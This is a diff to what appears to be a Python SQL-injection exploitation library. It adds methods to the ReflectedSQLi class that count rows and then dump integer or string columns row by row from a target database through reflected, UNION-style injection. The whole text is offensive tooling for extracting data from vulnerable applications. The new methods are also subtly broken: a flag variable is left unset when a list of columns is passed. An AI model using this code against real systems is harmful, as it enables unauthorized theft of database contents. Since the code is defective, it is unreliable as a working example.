@@ -68,11 +68,11 @@ class ReflectedSQLi(SQLi, ABC):
         self.column_types = column_types
 
     @abstractmethod
-    def reflected_sqli(columns: list, table=None, condition=None, offset=None):
+    def reflected_sqli(self, columns: list, table=None, condition=None, offset=None, verbose=False):
         pass
 
     def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False):
-        query_columns = [column] + list(map(lambda c: f"'{c}'", range(2, len(self.column_types))))
+        query_columns = [column] + list(map(str, range(2, len(self.column_types) + 1)))
         return int(self.reflected_sqli(query_columns, table, condition, offset)[0])
 
     def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
@@ -84,6 +84,69 @@ class ReflectedSQLi(SQLi, ABC):
         query_columns = list(map(lambda c: f"'{c}'", range(len(self.column_types))))
         query_columns[str_column] = column
         return self.reflected_sqli(query_columns, table, condition, offset)[str_column]
+
+    def extract_multiple_ints(self, columns: list|str, table=None, condition=None, verbose=False):
+        if isinstance(columns, str):
+            columns = [columns]
+            one = True
+
+        column_count = len(columns)
+        if len(self.column_types) < column_count:
+            print(f"[!] Reflectd SQL does not reflect required amount of columns. required={column_count}, got={len(self.column_types)}")
+            return None
+
+        query_columns = columns + list(map(str, range(column_count + 1, len(self.column_types) + 1)))
+        row_count = self.extract_int(f"COUNT(*)", table=table, condition=condition, verbose=verbose)
+        if verbose:
+            print(f"Fetching {row_count} rows")
+
+        rows = []
+        column_str = ",".join(query_columns)
+        for i in range(0, row_count):
+            row = self.reflected_sqli(query_columns, table, condition, i, verbose=verbose)
+            if one:
+                rows.append(int(row[0]))
+            else:
+                rows.append(list(map(lambda i: int(row[i]), range(column_count))))
+
+        return rows
+
+    def extract_multiple_strings(self, columns: list|str, table=None, condition=None, verbose=False):
+        if isinstance(columns, str):
+            columns = [columns]
+            one = True
+
+        column_count = len(columns)
+        if self.column_types.count(str) < column_count:
+            print(f"[!] Reflectd SQL does not reflect required amount of string columns. required={column_count}, got={self.column_types.count(str)}")
+            return None
+
+        query_columns = list(map(str, range(1, len(self.column_types) + 1)))
+        offsets = list(None for _ in range(column_count))
+        offset = 0
+        for i, column in enumerate(columns):
+            while self.column_types[offset] != str:
+                offset += 1
+            offsets[i] = offset
+            query_columns[offset] = column
+            offset += 1
+
+        row_count = self.extract_int(f"COUNT(*)", table=table, condition=condition, verbose=verbose)
+        if verbose:
+            print(f"Fetching {row_count} rows")
+
+        rows = []
+        column_str = ",".join(query_columns)
+        for i in range(0, row_count):
+            row = self.reflected_sqli(query_columns, table, condition, i, verbose=verbose)
+            if one:
+                rows.append(row[offsets[0]])
+            else:
+                rows.append(list(map(lambda o: row[o], offsets)))
+
+        return rows
+
+    # todo: extract_multiple with columns as dict (name -> type), e.g. extract_multiple({"id": int, "name": str})
 
 class BlindSQLi(SQLi, ABC):
 
